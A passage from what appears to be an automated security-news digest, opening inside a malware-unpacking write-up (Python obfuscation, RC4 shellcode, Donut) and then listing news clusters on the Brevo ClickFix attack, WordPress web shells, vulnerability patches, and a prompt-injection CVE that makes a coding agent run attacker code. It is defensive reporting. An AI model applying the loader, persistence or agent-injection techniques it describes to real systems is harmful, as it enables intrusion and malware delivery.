Byte-compiled Python module for CPython 3.13 (magic: 3571), timestamp-based, .py timestamp: Wed Jun 24 06:18:29 2026 UTC, .py size: 8371083 bytes Let’s see what strings are visible in the file. Most of the time, I will use strings, but this time I opened the file in Vim. I noticed the string Kramer right away, and later in the file there is a large blob of text, which seemed to make no sense at first. Figure 2 - HEX View of the File Showing Kramer String Figure 3 - HEX View of the File Showing the Obfuscated Code Next, we need to get from a .pyc file to .py. I used the NPX to convert from the bytecode to standard Python, which makes the script much easier to read. Figure 4 - Obfuscated Code after Converting from pyc to py After searching for a little while, I came across the Kramer GitHub repo . This matched what I was seeing perfectly. The only problem was that it was protected by a key, so back to searching again. This time I came across a tool to brute-force the key, kramer_python_ deobfuscator.py . I launched the deobfuscator against the sample and my server was immediately spiked. Figure 5 - Showing the CPU usage of While Bruteforcing key I let this run for an hour before going to bed. In the morning, it recovered the sample. However, I did not look close enough at the code and missed that it wrote the output to STDOUT, so I needed to run the tool again. It took hours to complete, and I didn't want to wait for that. After reading the code, I realized the tool was reading in the whole encoded command but only needed a small section. After the modifications below, the key was recovered in less than a minute. Figure 6 - Modification to Tools The Python source code was recovered as sampled below. Figure 7 - Sample of the Recovered Python code The Python code contained a base64 encoded string that is RC4 encrypted. This shellcode is then copied into a section of memory with the permissions needed to execute, and execution is passed to that code. After decoding and decrypting the string, we have access to our first shellcode. Stage 2: First Donut Layer The Python script hands off to shellcode generated by Thewover's Donut , a tool that wraps arbitrary executables or .NET assemblies into position-independent x86-64 shellcode. During the initial analysis, I did not know this was created with the tool Donut. I loaded the sample into Ghidra and started resolving strings and function pointers. Only after I manually decoded and extracted the embedded executable did I id
```

#### Corroborating sources (1)

- **TrustedSec** (detection_response_operations)
  - Title: Unpacking a laZzzy Donut
  - Published: 2026-09-17T04:00:00+00:00
  - Link: https://trustedsec.com/blog/unpacking-a-lazzzy-donut
  - Summary: <p>Six stages. Multiple encryption layers. One static analysis. In this blog, we unpack a multi-stage malware loader combining Python obfuscation, Donut shellcode, and laZzzy PE encryption, without executing the payload.</p>

### Cluster 10a9a0f66e — score 9

- Title: DPRK and Iran are Leading a 5.2x Surge YoY in Blockchain-Assisted Cyberattacks
- Source: Chainalysis (ransomware_ecrime_financial_crime)
- Published: 2026-09-17T13:04:56+00:00
- Link: https://www.chainalysis.com/blog/etherhiding-blockchain-dead-drops/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Summary Cyber threat actors are using public blockchains to hide malware instructions on blockchains, making it nearly impossible to seize… The post DPRK and Iran are Leading a 5.2x Surge YoY in Blockchain-Assisted Cyberattacks appeared first on Chainalysis .
```

#### Full body

```
Crime Tracing Crypto in a Narcotics Investigation: FBI Charges Alleged Opioid Distributors September 8, 2026
```

#### Corroborating sources (1)

- **Chainalysis** (ransomware_ecrime_financial_crime)
  - Title: DPRK and Iran are Leading a 5.2x Surge YoY in Blockchain-Assisted Cyberattacks
  - Published: 2026-09-17T13:04:56+00:00
  - Link: https://www.chainalysis.com/blog/etherhiding-blockchain-dead-drops/
  - Summary: Summary Cyber threat actors are using public blockchains to hide malware instructions on blockchains, making it nearly impossible to seize… The post DPRK and Iran are Leading a 5.2x Surge YoY in Blockchain-Assisted Cyberattacks appeared first on Chainalysis .

### Cluster cf140bd98b — score 9

- Title: Brevo supply-chain attack injected ClickFix scripts on customer sites
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-17T17:11:34+00:00
- Link: https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain, web_shell_backdoor
- affected_products: WordPress
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, web_shell_backdoor
- affected_products: WordPress
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Brevo confirmed that attackers stole a Cloudflare API key and used it to inject malicious ClickFix scripts into its websites and JavaScript files embedded on customer sites to distribute malware. [...]
```

#### Full body

```
Brevo supply-chain attack injected ClickFix scripts on customer sites By Bill Toulas September 17, 2026 01:11 PM 0 Brevo confirmed that attackers stole a Cloudflare API key and used it to inject malicious ClickFix scripts into its websites and JavaScript files embedded on customer sites to distribute malware. The customer relationship management and digital marketing company says the attackers used the API key to create a malicious Cloudflare Worker that modified content at the CDN edge for approximately five and a half hours on September 14. The attack affected pages on brevo.com, sendinblue.com, login/account/my/onboarding.brevo.com, and sibforms.com. The Cloudflare worker also modified the Brevo forms script, Brevo Conversations widget, and the Brevo SDK loader scripts that customers embed on their websites. In a post-mortem published today , Brevo explained that attackers obtained a long-lived Cloudflare API key with full account permissions that had been hardcoded in application source code, which allowed them to create Cloudflare Workers, routes, and DNS records across Brevo's zones without triggering an alert. "Because the Worker rewrote responses at the edge and removed security headers such as Content-Security-Policy, our origin servers and files remained unmodified and standard integrity checks did not detect the change," explained Brevo. The company says the key may have been compromised as early as late August, but there's no evidence of prior malicious activity. Upon detecting the compromise, Brevo removed the Worker and its routes, defining the exposure window as between 16:07 and 20:30 UTC. In the hours that followed, the company revoked the compromised key and credentials created with it, removed the hardcoded credential from its source code, deleted attacker-controlled hostnames, and purged its edge caches. Brevo says app.brevo.com, its API, email delivery infrastructure, and customer account data were not affected. Used in ClickFix attacks The incident was first reported by security firm Sansec, which reported that it may have impacted up to 100,000 websites that use the affected Brevo components. Sansec says the incident began on September 14, 2026, between 16:05 and 20:13 UTC, but has now confirmed that all malicious subdomains stopped resolving on September 15, and Brevo files are now clean. Visitors to these websites were shown a fake Cloudflare verification page, followed by ClickFix instructions urging them to run a command on Windows. ClickFix lure on the Brevo website Source: @calgarywebdev On WordPress websites embedding an affected Brevo widget, the script also checked whether the visitor was logged in as an administrator and attempted to upload a malicious plugin from https://cdn10.sendibt1[.]com/p/wm.zip . While SanSec was not able to retrieve the archive, BleepingComputer found it uploaded to VirusTotal and can confirm it pretends to be a WordPress plugin named "Web Media Optimizer" but acts as a persistent backdoor and JavaScript loader. Other domains BleepingComputer saw distributing the malicious WordPress plugin and scripts include https://yelahaye[.]surf and https://boiseno[.]club . Once installed, it hides itself from the WordPress plugin list, copies itself into the must-use plugins directory for persistence, and periodically contacts the attacker-controlled 'https://glegchner.com/ads.php' server. Malicious Web Media Optimizer plugin with auth credential redacted Source: BleepingComputer That URL is currently returning a Base64-encoded URL pointing to JavaScript that the plugin then injects into visitors' pages. The current Base64-encoded URL decodes to https://corralos[.]beer/a412dkoq.js , which the site injects to fetch a ClickFix lure to display. The plugin also stores a backup copy of the last valid JavaScript URL so it can continue loading malicious code if the remote server becomes unavailable. Finally, the plugin contains a hardcoded authentication key that allows attackers to gener
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Brevo supply-chain attack injected ClickFix scripts on customer sites
  - Published: 2026-09-17T17:11:34+00:00
  - Link: https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
  - Summary: Brevo confirmed that attackers stole a Cloudflare API key and used it to inject malicious ClickFix scripts into its websites and JavaScript files embedded on customer sites to distribute malware. [...]

### Cluster 6aa779b57e — score 9

- Title: Cisco Fixes Dozens of Flaws Across FMC, ISE and Nexus Dashboard
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-17T12:17:40+00:00
- Link: https://www.securityweek.com/cisco-fixes-dozens-of-flaws-across-fmc-ise-and-nexus-dashboard/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The vulnerabilities may lead to root access, command execution, bypasses, SQL injection, and remote code execution. The post Cisco Fixes Dozens of Flaws Across FMC, ISE and Nexus Dashboard appeared first on SecurityWeek .
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Cisco Fixes Dozens of Flaws Across FMC, ISE and Nexus Dashboard
  - Published: 2026-09-17T12:17:40+00:00
  - Link: https://www.securityweek.com/cisco-fixes-dozens-of-flaws-across-fmc-ise-and-nexus-dashboard/
  - Summary: The vulnerabilities may lead to root access, command execution, bypasses, SQL injection, and remote code execution. The post Cisco Fixes Dozens of Flaws Across FMC, ISE and Nexus Dashboard appeared first on SecurityWeek .

### Cluster 7a044cf714 — score 9

- Title: Attackers Exploit WooCommerce Wholesale Lead Capture Flaw to Plant PHP Web Shells
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-16T05:48:28+00:00
- Link: https://thehackernews.com/2026/09/attackers-exploit-woocommerce-wholesale.html
- Fetch status: not_attempted
- Member count: 2
- Corroborating source count: 2
- Strong signals: WordPress

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_products: WordPress
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_products: WordPress
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors are exploiting a critical security flaw in WooCommerce Wholesale Lead Capture, a premium WordPress plugin that has more than 6,000 active installs. "This vulnerability can be leveraged by unauthenticated attackers to upload arbitrary files, including PHP backdoors, and achieve remote code execution," Wordfence said. The WordPress security company said it has blocked over
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit WooCommerce Wholesale Lead Capture Flaw to Plant PHP Web Shells
  - Published: 2026-09-16T05:48:28+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-woocommerce-wholesale.html
  - Summary: Threat actors are exploiting a critical security flaw in WooCommerce Wholesale Lead Capture, a premium WordPress plugin that has more than 6,000 active installs. "This vulnerability can be leveraged by unauthenticated attackers to upload arbitrary files, including PHP backdoors, and achieve remote code execution," Wordfence said. The WordPress security company said it has blocked over
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: PHP Webshell Campaign Targets WordPress Through Critical WooCommerce Plugin Bug
  - Published: 2026-09-16T15:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/woocommerce-wholesale-lead-capture/
  - Summary: Attackers are exploiting a critical flaw in a third-party WooCommerce plugin to upload PHP webshells

### Cluster 367f814170 — score 9

- Title: CVE-2026-90999: A fabricated Sentry bug report can make Seer's coding agent run attacker code
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-09-17T14:11:25+00:00
- Link: https://www.reddit.com/r/netsec/comments/1wiv4bm/cve202690999_a_fabricated_sentry_bug_report_can/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-90999

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-90999
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2026-90999
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/Ok-Pepper-2354 [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: CVE-2026-90999: A fabricated Sentry bug report can make Seer's coding agent run attacker code
  - Published: 2026-09-17T14:11:25+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wiv4bm/cve202690999_a_fabricated_sentry_bug_report_can/
  - Summary: submitted by /u/Ok-Pepper-2354 [link] [comments]

### Cluster 8040666183 — score 9

- Title: Introducing new session management tools with native, granular controls
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-09-15T17:30:00+00:00
- Link: https://cloud.google.com/blog/products/identity-security/introducing-new-session-management-tools-with-native-granular-controls/
- Fetch status: not_attempted
- Member count: 2
- Corroborating source count: 2
- Strong signals: Google Cloud

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Google Cloud session management provides flexible options for setting up session controls based on your organization’s security policy needs. To help you improve your security posture and mitigate credential theft and account takeover (ATO) risks, we have rolled out a 16-hour default session length for Google Cloud customers. We’ve now completed extending this security standard to all customers who had not already self-configured session lengths, but today’s cloud environments require even more precision. As we conclude this global rollout, we have also evolved Google Cloud session controls from a broad administrative setting into a deeply integrated, granular feature of Context-Aware Access (CAA). This update gives administrators more flexibility, better automation, and a more natural security workflow. What’s new in Session Controls 1. Automation-first: Terraform, gcloud, and API support Modern infrastructure is managed as code. To support DevSecOps workflows, the Session Controls po
```

#### Corroborating sources (2)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Introducing new session management tools with native, granular controls
  - Published: 2026-09-15T17:30:00+00:00
  - Link: https://cloud.google.com/blog/products/identity-security/introducing-new-session-management-tools-with-native-granular-controls/
  - Summary: Google Cloud session management provides flexible options for setting up session controls based on your organization’s security policy needs. To help you improve your security posture and mitigate credential theft and account takeover (ATO) risks, we have rolled out a 16-hour default session length for Google Cloud customers. We’ve now completed extending this security standard to all customers who had not already self-configured session lengths, but today’s cloud environments require even more precision. As we conclude this global rollout, we have also evolved Google Cloud session controls from a broad administrative setting into a deeply integrated, granular feature of Context-Aware Access (CAA). This update gives administrators more flexibility, better automation, and a more natural security workflow. What’s new in Session Controls 1. Automation-first: Terraform, gcloud, and API support Modern infrastructure is managed as code. To support DevSecOps workflows, the Session Controls po
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: CISO's Expert Guide to Agentic Pentesting for Websites
  - Published: 2026-09-17T10:50:53+00:00
  - Link: https://thehackernews.com/2026/09/cisos-expert-guide-to-agentic.html
  - Summary: Attackers now weaponize new vulnerabilities in about five days (Mandiant, part of Google Cloud). The median organization takes 43 days to patch one (Verizon DBIR 2026). A new free guide explains how autonomous AI agents are closing that gap, and what security leaders must demand before pointing one at production. TL;DR Exploitation is now the front door. It starts 31% of breaches (Verizon DBIR

### Cluster 900a6c21c2 — score 8

- Title: September Patch Tuesday haul includes 973 CVEs
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-16T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/september-2026-patch-tuesday
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>Windows takes 718 fixes… but what if it was actually a slow month?</p> Categories: Threat Research Tags: Patch Tuesday, x-ops, Threat Research
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: September Patch Tuesday haul includes 973 CVEs
  - Published: 2026-09-16T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/september-2026-patch-tuesday
  - Summary: <p>Windows takes 718 fixes… but what if it was actually a slow month?</p> Categories: Threat Research Tags: Patch Tuesday, x-ops, Threat Research

### Cluster d62ec97b2c — score 8

- Title: ai research messageboards
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-15T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/ai-research-messageboards
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>This article was first published <a href="https://www.linkedin.com/pulse/messageboards-all-you-need-nash-borges-iav6c" target="_blank">on LinkedIn.</a></p> Categories: AI Research, Threat Research Tags: AI, AI Cybersecurity, Threat Research
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: ai research messageboards
  - Published: 2026-09-15T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/ai-research-messageboards
  - Summary: <p>This article was first published <a href="https://www.linkedin.com/pulse/messageboards-all-you-need-nash-borges-iav6c" target="_blank">on LinkedIn.</a></p> Categories: AI Research, Threat Research Tags: AI, AI Cybersecurity, Threat Research

### Cluster eb4074e0b4 — score 8

- Title: Devil’s advocate? Uncensored Luciferus AI service advertised underground
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-14T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/uncensored-luciferus-ai-service-advertised-underground
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Uncensored refers to a lack of typical guardrails or ethical restrictions, lowering the technical barrier of entry into cybercrime Categories: Threat Research Tags: AI, Luciferus, underground
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: Devil’s advocate? Uncensored Luciferus AI service advertised underground
  - Published: 2026-09-14T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/uncensored-luciferus-ai-service-advertised-underground
  - Summary: Uncensored refers to a lack of typical guardrails or ethical restrictions, lowering the technical barrier of entry into cybercrime Categories: Threat Research Tags: AI, Luciferus, underground

### Cluster ffd1b995a8 — score 8

- Title: “Eye” spy: Cyclops Blink returns with extended capabilities
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-11T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/-eye-spy-cyclops-blink-returns-with-extended-capabilities
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Upgraded modular malware observed in attacks on Cisco Firewall Management Center (FMC) devices Categories: Threat Research Tags: Cyclops Blink, Cisco, Linux
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: “Eye” spy: Cyclops Blink returns with extended capabilities
  - Published: 2026-09-11T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/-eye-spy-cyclops-blink-returns-with-extended-capabilities
  - Summary: Upgraded modular malware observed in attacks on Cisco Firewall Management Center (FMC) devices Categories: Threat Research Tags: Cyclops Blink, Cisco, Linux

### Cluster c06803afa0 — score 8

- Title: Google Doc Sidebar Sends Mac and Windows Users Down Different Paths to Malware
- Source: Huntress (detection_response_operations)
- Published: 2026-09-15T13:00:00+00:00
- Link: https://www.huntress.com/blog/google-doc-sidebar-malware-mac-windows
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
A single X DM split into two malware chains: AMOS stealer on Mac, NetSupport Manager on Windows, see the Huntress SOC analyst breakdown.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Google Doc Sidebar Sends Mac and Windows Users Down Different Paths to Malware
  - Published: 2026-09-15T13:00:00+00:00
  - Link: https://www.huntress.com/blog/google-doc-sidebar-malware-mac-windows
  - Summary: A single X DM split into two malware chains: AMOS stealer on Mac, NetSupport Manager on Windows, see the Huntress SOC analyst breakdown.

### Cluster 4eb7d63bfd — score 8

- Title: How Attackers Abuse VSS, and How Huntress Detects It
- Source: Huntress (detection_response_operations)
- Published: 2026-09-14T13:00:00+00:00
- Link: https://www.huntress.com/blog/vss-abuse-explained
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Attackers exploit Volume Shadow Copy for credential theft and ransomware defense evasion. See how Huntress spots the difference from routine IT activity.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: How Attackers Abuse VSS, and How Huntress Detects It
  - Published: 2026-09-14T13:00:00+00:00
  - Link: https://www.huntress.com/blog/vss-abuse-explained
  - Summary: Attackers exploit Volume Shadow Copy for credential theft and ransomware defense evasion. See how Huntress spots the difference from routine IT activity.

### Cluster 0749058123 — score 8

- Title: Spain's data agency gets first report of AI-powered data breach
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-16T17:26:41+00:00
- Link: https://www.bleepingcomputer.com/news/security/spains-data-agency-gets-first-report-of-ai-powered-data-breach/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The Spanish Data Protection Agency (AEPD) was notified of an attack allegedly carried out with an AI agent powered by a known large language model (LLM). [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Spain's data agency gets first report of AI-powered data breach
  - Published: 2026-09-16T17:26:41+00:00
  - Link: https://www.bleepingcomputer.com/news/security/spains-data-agency-gets-first-report-of-ai-powered-data-breach/
  - Summary: The Spanish Data Protection Agency (AEPD) was notified of an attack allegedly carried out with an AI agent powered by a known large language model (LLM). [...]

### Cluster 34f1ec83aa — score 8

- Title: The true cost of a ransomware attack, with and without BCDR
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-16T14:00:10+00:00
- Link: https://www.bleepingcomputer.com/news/security/the-true-cost-of-a-ransomware-attack-with-and-without-bcdr/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: legal_professional
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: legal_professional
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The ransom itself can be only a fraction of the total cost of a ransomware attack, with downtime, recovery, remediation, and legal obligations adding millions to the bill. Datto explains how a mature BCDR strategy can reduce downtime and provide a faster, more predictable path to recovery. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: The true cost of a ransomware attack, with and without BCDR
  - Published: 2026-09-16T14:00:10+00:00
  - Link: https://www.bleepingcomputer.com/news/security/the-true-cost-of-a-ransomware-attack-with-and-without-bcdr/
  - Summary: The ransom itself can be only a fraction of the total cost of a ransomware attack, with downtime, recovery, remediation, and legal obligations adding millions to the bill. Datto explains how a mature BCDR strategy can reduce downtime and provide a faster, more predictable path to recovery. [...]

### Cluster d784168b3d — score 8

- Title: SpiderSilk Hunts External Threats With AI-Based Scanner
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-09-11T18:27:28+00:00
- Link: https://www.darkreading.com/endpoint-security/spidersilk-hunts-external-threats-ai-scanning
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The Dubai-based threat detection startup uses artificial intelligence tools to scan billions of IP addresses to find exposed assets, leaked data, and zero-day vulnerabilities.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: SpiderSilk Hunts External Threats With AI-Based Scanner
  - Published: 2026-09-11T18:27:28+00:00
  - Link: https://www.darkreading.com/endpoint-security/spidersilk-hunts-external-threats-ai-scanning
  - Summary: The Dubai-based threat detection startup uses artificial intelligence tools to scan billions of IP addresses to find exposed assets, leaked data, and zero-day vulnerabilities.

### Cluster 8b3e444f10 — score 8

- Title: China-Aligned FamousSparrow Deploys SparroWocky Backdoor Across Latin America
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-17T10:05:45+00:00
- Link: https://thehackernews.com/2026/09/china-aligned-famoussparrow-deploys.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The China-aligned state-sponsored threat actor known as FamousSparrow has been observed deploying a previously unreported backdoor called SparroWocky in attacks targeting multiple countries in Latin America since at least August 2025. "SparroWocky is a modular, C++ backdoor," ESET security researchers Alexandre Côté Cyr and Romain Dumont said in a technical report shared with The Hacker News
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: China-Aligned FamousSparrow Deploys SparroWocky Backdoor Across Latin America
  - Published: 2026-09-17T10:05:45+00:00
  - Link: https://thehackernews.com/2026/09/china-aligned-famoussparrow-deploys.html
  - Summary: The China-aligned state-sponsored threat actor known as FamousSparrow has been observed deploying a previously unreported backdoor called SparroWocky in attacks targeting multiple countries in Latin America since at least August 2025. "SparroWocky is a modular, C++ backdoor," ESET security researchers Alexandre Côté Cyr and Romain Dumont said in a technical report shared with The Hacker News

### Cluster 17f3b2d918 — score 8

- Title: BIND 9 Update Fixes 14 Flaws, Including an Unauthenticated Crash Over DNS-over-HTTPS
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-17T08:00:29+00:00
- Link: https://thehackernews.com/2026/09/bind-9-update-fixes-14-flaws-including.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The Internet Systems Consortium (ISC) has released BIND 9.20.29 and 9.21.26 to fix fourteen security flaws it disclosed on 16 September in BIND 9, its open-source DNS server software. One of them affects any BIND server that answers DNS-over-HTTPS (DoH). A sender with no credentials can crash the server process, named, with a single request that carries an invalid SIG
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: BIND 9 Update Fixes 14 Flaws, Including an Unauthenticated Crash Over DNS-over-HTTPS
  - Published: 2026-09-17T08:00:29+00:00
  - Link: https://thehackernews.com/2026/09/bind-9-update-fixes-14-flaws-including.html
  - Summary: The Internet Systems Consortium (ISC) has released BIND 9.20.29 and 9.21.26 to fix fourteen security flaws it disclosed on 16 September in BIND 9, its open-source DNS server software. One of them affects any BIND server that answers DNS-over-HTTPS (DoH). A sender with no credentials can crash the server process, named, with a single request that carries an invalid SIG

### Cluster 49753d82ce — score 8

- Title: Attackers Exploit Issabel Framework Flaw Enabling Unauthenticated OS Command Execution
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-16T15:50:59+00:00
- Link: https://thehackernews.com/2026/09/attackers-exploit-issabel-framework.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-89026

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-89026
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-89026
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical security flaw in Issabel Framework, a web-based framework for the open-source unified communications PBX software, has come under active exploitation. The vulnerability in question is CVE-2026-89026 (CVSS v3.1 score: 9.8/CVSS v4.0 score: 9.3), which can allow an unauthenticated remote attacker to execute arbitrary operating system (OS) commands by taking advantage of a hard-coded
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Issabel Framework Flaw Enabling Unauthenticated OS Command Execution
  - Published: 2026-09-16T15:50:59+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-issabel-framework.html
  - Summary: A critical security flaw in Issabel Framework, a web-based framework for the open-source unified communications PBX software, has come under active exploitation. The vulnerability in question is CVE-2026-89026 (CVSS v3.1 score: 9.8/CVSS v4.0 score: 9.3), which can allow an unauthenticated remote attacker to execute arbitrary operating system (OS) commands by taking advantage of a hard-coded

### Cluster 4b8281c753 — score 8

- Title: China-Linked Hackers Exploit Chrome-Windows Zero-Day Chain to Deploy GRIMWEDGE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-15T05:31:05+00:00
- Link: https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, web_shell_backdoor, zero_day
- affected_industries: government
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, web_shell_backdoor
- affected_industries: government
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
